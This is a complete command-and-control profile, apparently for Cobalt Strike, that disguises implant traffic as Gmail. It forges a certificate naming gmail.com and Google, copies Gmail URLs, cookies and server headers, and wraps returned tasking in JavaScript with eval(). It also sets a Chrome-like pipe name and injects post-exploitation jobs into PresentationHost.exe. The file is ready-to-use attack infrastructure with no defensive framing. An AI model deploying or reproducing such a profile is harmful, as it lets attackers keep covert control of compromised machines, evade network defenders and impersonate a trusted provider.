# Gmail C2 Profile - by AKUMA from team Kibers

https-certificate {
    set CN       "gmail.com";
    set O        "Google GMail";
    set C        "US";
    set L        "Mountain View";
    set OU       "Google Mail";
    set ST       "CA";
    set validity "365";
}

set sleeptime "1000";
set jitter "25";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
set pipename "chrome-sync-%rand%";

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\PresentationHost.exe";
    set spawnto_x64 "%windir%\\sysnative\\PresentationHost.exe";
}

http-get {
    set uri "/mail/u/0/view-tl";

    client {
        metadata {
            base64;
            prepend "OSID=";
            header "Cookie";
        }

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";
        header "DNT" "1";
    }

    server {
        header "X-Content-Type-Options" "nosniff";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Cache-Control" "public, max-age=31536000";
        header "X-XSS-Protection" "1; mode=block";
        header "Server" "GSE";
        header "Alternate-Protocol" "443:quic,p=1";

        output {
            prepend "try{";
            prepend "var gmail_data='";
            append "';";
            append "eval(gmail_data);";
            append "}catch(e){console.log(e);}";
            print;
        }
    }
}

http-post {
    set uri "/mail/u/0/upload";

    client {
        parameter "ui" "d3244c4707";
        parameter "hop" "6928632";
        parameter "start" "0";
        header "Content-Type" "application/x-www-form-urlencoded;charset=utf-8";

        id {
            base64;
            prepend "OSID=";
            header "Cookie";
        }

        output {
            base64;
            print;
        }
    }

    server {
        header "X-Content-Type-Options" "nosniff";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Cache-Control" "no-cache, no-store, max-age=0, must-revalidate";
        header "X-XSS-Protection" "1; mode=block";
        header "Server" "GSE";

        output {
            prepend "[[[\"apm\",\"";
            append "\"]";
            append ",[\"ci\",[]";
            append "]";
            append ",[\"cm\",[]";
            append ",[]";
            append "]";
            append "],'dbb8796a80d45e1f']";
            print;
        }
    }
}
